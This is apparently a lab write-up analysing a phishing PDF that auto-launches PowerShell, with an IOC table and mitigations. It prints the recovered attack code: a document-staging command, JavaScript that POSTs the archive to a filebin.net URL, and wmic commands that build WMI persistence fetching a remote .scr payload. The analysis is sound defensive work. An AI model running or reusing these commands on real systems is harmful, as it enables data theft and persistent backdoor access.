---
title: "Malicious PDF Analysis"
categories:
  - Malware Analysis
  - Digital Forensics
tags:
  - PDF
  - PowerShell
  - WMI
  - Incident Response
---

# Malware Analysis Report: Malicious PDF

## Scenario
An employee received a phishing email featuring a malicious PDF attachment titled `Update.pdf`, disguised as an urgent operational announcement regarding an annual systems update. A thorough technical analysis revealed a multi-stage attack vector. Upon opening, the PDF automatically triggers a code execution chain leveraging an `/OpenAction` dictionary to spawn a hidden PowerShell command without requiring user interaction. The payload compresses local documents for staging, utilizes packed JavaScript to exfiltrate the archive to an external file-sharing service, and establishes WMI event subscriptions for backdoor persistence.

---

## Scenario Overview
* **Sender:** `SystemsUpdate@letsdefend.io`
* **Recipient:** `Paul@letsdefend.io`
* **Subject:** Critical - Annual Systems UPDATE NOW
* **Attachment Name:** `Update.pdf`
* **Primary Threat Classification:** Malicious PDF Document / Data Exfiltration & Persistence

---

## Initial File Details
* **Filename:** `Update.pdf`
* **SHA256 Hash:** `ac3d6089d459195800931784a175b31fd65e20a937488acd95477db7dd253280`

---

## Attack Execution Flow (Diagram)

![](https://i.imgur.com/lTsWmJt.png)

The attack chain diagram illustrates the multi-stage execution flow triggered when a user opens the malicious `Update.pdf` attachment. Once opened, the document automatically executes a command-line interpreter (`cmd.exe`), which spawns an encoded PowerShell process to execute two parallel malicious routines. On one branch, the script compresses sensitive user files into a local zip archive and exfiltrates the data via an HTTP POST request to an external drop zone (`filebin.net`).

On the other branch, the payload establishes persistent backdoor access by configuring a WMI event subscription. This mechanism utilizes the PowerPoint executable (`Powerpnt.exe`) as a living-off-the-land binary (LOLBin) to periodically pull a remote malicious screensaver payload (`wallpaper482.scr`) from the attacker's command-and-control server (`60.187.184.54`). Together, these paths highlight a sophisticated phishing campaign designed for both immediate data theft and long-term system compromise.

---

## Detailed Technical Analysis & Execution Chain

### 1. Initial Access & Automatic Triggering
When the victim opens the malicious document, the PDF structure immediately processes an explicit `/OpenAction` trigger paired with a `/Launch` and `/Win` action parameter. This forces the PDF reader to invoke an external application (`cmd.exe` or `powershell.exe`) without prompting the user or relying on traditional macro permissions.

![](https://i.imgur.com/gZIIvMq.png)

### 2. Staging and Local Data Compression
Contained within Object 19, the execution path reveals an encoded PowerShell command designed to stage user files. The script invokes native cmdlets such as `Compress-Archive` targeting the user's `C:\Documents\` directory. All personal files and folders are bundled into a locally stored, obscurely named ZIP archive (`zniwkejnnwnqw%D0csz1p`) to prep them for extraction.

```powershell
Compress-Archive -Path C:%Documents%* -Update -DestinationPath C:%Documents%zniwkejnnwnqw%D0csz1p
```

![](https://i.imgur.com/Gl6rN6S.png)

### 3. Exfiltration via External Drop Zone
Further structural review of Object 33 exposed an embedded JavaScript payload protected by the **Dean Edwards Packer** (`eval(function(p,a,c,k,e,d)...)`). Once unpacked, the script uses an asynchronous `XMLHttpRequest` via an HTTP POST request to upload the newly created archive (`D0csz1p`) directly to an anonymous, external drop zone on `filebin.net`.
![ZJZL7Fy.png](https://i.imgur.com/ZJZL7Fy.png)

```javascript
var url="https://filebin.net/0flqlz0hiz6o4l32/D0csz1p";
var xhr=new XMLHttpRequest();
xhr.open("POST",url);
xhr.setRequestHeader("Content-Type: application/octet-stream","application/json");
xhr.onreadystatechange=function(){
    if(xhr.readyState===4){
        console.log(xhr.status);
        console.log(xhr.responseText)
    }
};
var data='{"login":"","password":""}';
xhr.send(data);
```

### 4. Backdoor Persistence via WMI
Analysis of Object 26 uncovered an obfuscated WMI command string designed to maintain persistence across system reboots:
* **Event Filter (`__EventFilter`):** Registers a persistent trigger tracking system performance metrics (`Win32_PerfFormattedData_PerfOS_System`) every 9,000 seconds (approximately 2.5 hours).
* **Event Consumer (`CommandLineEventConsumer`):** Configures an action to leverage a trusted LOLBin executable path (`Powerpnt.exe`) while retrieving an external screensaver payload (`wallpaper482.scr`) from a remote command-and-control IP address.
* **Filter-to-Consumer Binding (`__FilterToConsumerBinding`):** Links the timer event to the consumer to guarantee continuous background execution.

```powershell
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="eGfQekUIgc", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 9000 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="RHWsZbGvlj", ExecutablePath="C:\Program Files\Microsoft Office\root\Office16\Powerpnt.exe 'http://60.187.184.54/wallpaper482.scr' ",CommandLineTemplate="C:\Users\%USERPROFILE%\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\wallpaper482.scr"

wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"eGfQekUIgc\"", Consumer="CommandLineEventConsumer.Name=\"RHWsZbGvlj\""
```



---

## Indicators of Compromise (IOCs)

| Indicator Type | Value / Description | Context |
| :--- | :--- | :--- |
| **File Name** | `Update.pdf` | Malicious email attachment |
| **File Hash (SHA256)** | `ac3d6089d459195800931784a175b31fd65e20a937488acd95477db7dd253280` | Sample identifier |
| **Staged Archive Name** | `D0csz1p` (ZIP archive) | Local container bundling stolen documents |
| **Target Directory** | `C:\Documents\` | Local directory targeted for staging |
| **Exfiltration Domain** | `filebin.net` | External file-hosting service used for data drop |
| **Exfiltration URL** | `https://filebin.net/0flqlz0hiz6o4l32/D0csz1p` | Full destination URL for uploaded data |
| **HTTP Method** | `POST` | Method used during data exfiltration |
| **C2 Server IP** | `60.187.184.54` (China) | External infrastructure hosting remote payloads |
| **Dropped Payload** | `wallpaper482.scr` | Remote executable payload fetched via persistence |
| **Persistence Artifact** | WMI Namespace `\\root\subscription` (`__EventFilter`, `CommandLineEventConsumer`) | Backdoor mechanism for persistent execution |

---

## Recommended Mitigations & Remediation Steps
1. **Network Containment:** Immediately isolate the infected workstation from the local network to prevent ongoing data exfiltration.
2. **Credential & Session Revocation:** Force a password reset for user `Paul` and inspect internal logs for lateral movement or unauthorized access.
3. **WMI Cleanup:** Inspect and scrub unauthorized event filters, consumers, and bindings under the `\\root\subscription` WMI namespace using administrative PowerShell scripts.
4. **Email Gateway Filtering:** Block sender address `SystemsUpdate@letsdefend.io` and add infrastructure indicators (such as `filebin.net` URLs and IP `60.187.184.54`) to corporate perimeter firewalls and proxy blacklists.